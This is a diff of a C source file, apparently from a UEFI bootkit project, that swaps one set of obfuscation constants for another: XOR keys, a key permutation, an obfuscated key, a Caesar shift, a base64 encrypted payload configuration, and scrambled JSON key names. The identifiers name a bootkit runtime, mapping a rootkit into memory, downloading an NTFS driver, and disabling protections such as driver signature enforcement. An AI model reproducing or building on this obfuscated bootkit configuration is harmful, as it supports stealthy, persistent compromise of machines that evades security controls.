@@ -39,31 +39,31 @@
 
 // Decrypt
 const UINTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyKeySize = 32;
-const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyXorKey = 0xbc;
-const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyPermutation[32] = {30, 2, 17, 11, 8, 9, 14, 4, 24, 3, 15, 20, 26, 27, 13, 7, 12, 23, 1, 16, 19, 25, 18, 5, 6, 21, 0, 10, 22, 31, 28, 29};
-const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyObfuscatedKey[32] = {0x1b, 0xe6, 0xd1, 0xb0, 0xb8, 0x01, 0xb4, 0x0f, 0x36, 0x75, 0xba, 0x4c, 0xf2, 0x69, 0xf8, 0xba, 0xcb, 0x1d, 0xa2, 0xe0, 0x77, 0xf1, 0xad, 0x3a, 0xec, 0x4a, 0x94, 0x71, 0x00, 0x80, 0x56, 0x8b};
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationXorKey = 0xfe;
-const INTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationCaesarShift = 17;
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationEncryptedConfiguration[] = "37yhyLmdzsreotyulafcsL6n17XDsMOix7WrzaCXv7DFyb6l2c6/3cXJ3sS429qqnpzKyJnQ0LvMpcmV4rjQvb2g4qidwKCoypy/pcTLoNre3sXJpKOr18XmwruepcunysSuzrXMl5fQvJm1xMi+wa2gqa2awsHDyKHgv6DHveLZyaKhxJvHrLCeyKuVv5vMwebNuJyaoaS8u+Ld2bC6np7KzbDOmKzKp9iuu5XEwpnJo6PNutmgqcPN3Jecxd+wo8m9n8Daw9jmrsOorp/I3arOybDX4Kuu18m14MS4xqTmwrjEqsPDyczLvKnNormV3qDdqJmj2aHQ36GXleK63JW9qZzepaepyL3LyZ2ZuqqqqpW1q9maqbqfyt6k3sS4wqif3qjb3Mqt3rqsoaTGvdjeqMffusDZmZjEzsKbztmsmsHduJXByKmpmsG3tcGim7udvsOuxszataK4zsyrxabKrMi9w57ioMLm3726tajfnsOd3tmlncOVrcSu2KC6t9uezqfNwr7B4rvFpea5npypyKC44q61wZ7LmLmcncyZvqTZ16yn2pyXoriV2rXFqrvXw7663KqioZXLxM6XvsyqvtDF2KOZvsekmMzEwMap3Niit5egqtjAqc7ipsDGyarEo5WYqde6p+bLzcmlndnCpabK3KKfn7DIrpvgysqww9/C3t7erq6/xcqhm8bEy9jMyKWfo96exKzOq6ieqKK9rqHZ28XNn+Ki3J+7rbW6oa21q5jcxN7M2Lye4tiln9i3wd6doMDY4rXXmMfI3NDFmuCgzaGg2NqrzsGXqcSeoZ+k0KzN2NinzcmjzNq5v6ilysmrtcOZuebJyszAnsXimMufyK64zarH35i8lb7epL/KrZ2ZoKOXwqis286+y+bHo87KxM27u56Y29q63pmo3Mi/oaa7quafqaTKnbDAptzavr2ny+DNuMLL2OKom8iu0Nm12qWl26Ga5r/gpaSVyJegl9neoZu1m5qYmJ3MtazBvt+crcfBt5eoyZ+s2s6exdfeo9zBmKamo9rdv7ub3ZeX2JrKoJywx9qcn8XEqsGVtbq/vtfgt6CcvN2+pcbIyqzAwqzJxL7M3+Leq9+aqMu4rrrZrbjL4tvZxavcw5vI2MPCmMC6y5mfqaHJzayo2qHb2qGeq6jNlauq3Z+sxr2muJq83Z6dp6XYotk=";
+const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyXorKey = 0x1c;
+const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyPermutation[32] = {0, 4, 27, 5, 20, 18, 7, 13, 14, 22, 12, 25, 19, 6, 10, 15, 16, 11, 23, 3, 17, 24, 8, 21, 31, 29, 28, 1, 30, 26, 9, 2};
+const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyObfuscatedKey[32] = {0xd9, 0xa6, 0x1f, 0x95, 0xcf, 0x56, 0xc4, 0x5d, 0xc3, 0x5e, 0x51, 0x0e, 0x83, 0xe0, 0xad, 0x51, 0xc3, 0x9b, 0x22, 0xe5, 0xcb, 0xd7, 0x74, 0x5a, 0xfc, 0x47, 0xf5, 0x82, 0xcd, 0x0f, 0x78, 0xba};
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationXorKey = 0x6c;
+const INTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationCaesarShift = 4;
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationEncryptedConfiguration[] = "GSsSPgcFXScyPgpLGkIxHGAeBzIyPiRBQkBBQQ4zLkdhQioHKS06Xl4dPQYzExMxJWAxH14uLV8RYWBLGC9jCUIfR18hXS1dHgs8XCpYGSZLOgwTGgpCWDJhXQgeBxNgBgYFLSkiHB8dX1kfQEAHOBFBWD8LXV0yIgxgYDE4Gjo/GAUrYjMRYwULLR9fXEM6HgxcPEIKHCwtHEIvXxwOXTksKxhiKgsRMyhdI2JZQllhQSAfEV0SEQpiMhMzEjwLX0sFWF0oEjIpGBk+J1hjOEJCLmITK1wEBzwFPR8/WCVeYjIRD0IpQUtgXQc/P2NdXgRAXiEFDjxBHEAEYjkGJkdCPg4NOC4qIAsdSzwlXiFYQxwNBxkhERo6GisHSy0/KCItHy4kXUcdExpDGQ1DJAkeKmI+OT0ZK2M+WS5dHgsZGDkRHAkGJDMSGSoFXiYTGVwHMwURWSQ+IyAYYVkHXQ4GMj4oKCwFLwUuKTgYIRliSzhiDRoPBy0iJCkuXl0sDxMoHwo6IGI8HQQFPUc6JCYdPTEoPEMmGCMIMSQFOiYRLkE9WEMYWV4SCQkTPRIsGGJjDRIhLywrGBoeBA8vXAckXzkyEw4NJjkiLkEmJzlBLx8hLz4LCi4uMkIIMQYgLysRYmNZDg4kHSc/MkMmJAckQA0dOFksEhg8KR8HXSwgSw0ODTguPiomXFheLxw5PSgEJz5cYT1CDhxDPTpAXQRfWWMcGEAMOSkHYCxhGA4kWThjLA4nLlkcEj0KEh84KjMKGCQ4MywZGUIFRwQPYgU4J14aR2IGEiMoIgk4LwxcXyERBwxHER06EwkRJzwzDiYoGFgZJiY4Sw8sEgcIKx8IXh1LYDpHQwkgK0IFYR9ABiZjISsxQyURXkE+OiseQB5AKhw8Jw8qEx4JD2EkIDpCQhMjQy8KJDMFMSEGWRM4DylcIF8aPCxLCS9DQRo5HgZgXh0RClwOJw4KX1kSXzIKCAQvGCoFJz8LQSgPWSUZYDEhKCNDXiQaGj5iJAoYXRIkElhdGioYLBEZXUEyPVkyHg1LPUEnPSE+DCkyMhhAXgQRBTpiBg8fJSAuQy0/J2AyRwc/WQUSJRkHCThBYEAuByAdR2JYXwRZIkMYImMRP1w5KC9HHF8oJF8HExpfBBgvSzwTKCs5Ih8PHDERHgtjIwgLWRIMBi8pXDE/KWFeLks6MwgeGmIOLFlgHzghGUEtSz8eCT0LYSoiY0coPD4ODRhHXzxgQToZQUsvOgo+OSNLXBEtLywhBUFZLitf";
 // Json Keys
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Screen[] = "R6>Z6";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Banner[] = "ZMF3_|hzXF$oIWb#";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageAbyssSquid[] = "N|YR+rvUxCoRz,AZSPXFm4YY";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageSquid[] = "kVHh+m?1voGl7H|feBhfLa_q";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerAscii[] = "kDd7GqxPhu";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriver[] = "-vsFur@RfVs,qNA3yO";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverDownload[] = "yDjELm-@gc7IJ+DxWLjF";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverURL[] = "1LWkQjINkB1+r";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverPath[] = "j|vQ;xIj:-TIU_-";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponent[] = "R3cVEz";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponentPath[] = "$SHoiHiFDk@Z#;9c!j";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntime[] = "CZ!cui+lQ";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntimePath[] = "FJS40qGdLp:";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBoot[] = "tNFrYNQTnfvyd:0&w!lM!MF_Fxab";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemory[] = "NicEQuQmEi2l;>Am?jJm-+460";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemoryModule[] = "rNk|yF";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtections[] = "eFlWP|Rp>pZB.U:f";
-const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtectionsDSE[] = "d4RYHko<?n+-jA72Q#<jp:";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Screen[] = "Hf3!FcN.w3iXEL<";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Banner[] = "?lq>sdUop;t";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageAbyssSquid[] = "tFG,&Z1snc4MWn,vZOy|iZV&ICbQ";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageSquid[] = "RLo0Lo-Fz";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerAscii[] = "OXO2t";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriver[] = ">xAT1vR,";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverDownload[] = "m6OAgaw$Gzi.9:JKPsxM66v$Bu";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverURL[] = "BA-rNhbQg@XXU";      
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverPath[] = "WeI5CcA<Yco<oqqr0fg@aTf";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponent[] = "GZ63mTs!3nt|ZIzu48icfz-N";  
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponentPath[] = "1Hw#a1Bdo5&Ljn>@@buliomdsrRwG$";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntime[] = ";1PGJEH1BA2RWnVluMD";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntimePath[] = "#whh9B?KuBRgJBeRu5ZGA8X0g-_";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBoot[] = "2nVIUVkv9-dbJO_nHc";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemory[] = "T4?PTp@4N-3iIMhw5FduwcV;Xw;I$#";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemoryModule[] = "F&@p+?|3|ct>mh";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtections[] = "WWI?!0+";
+const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtectionsDSE[] = "f8Y$EkdAp&NRMC>!XOf>6!P";
 
 
 
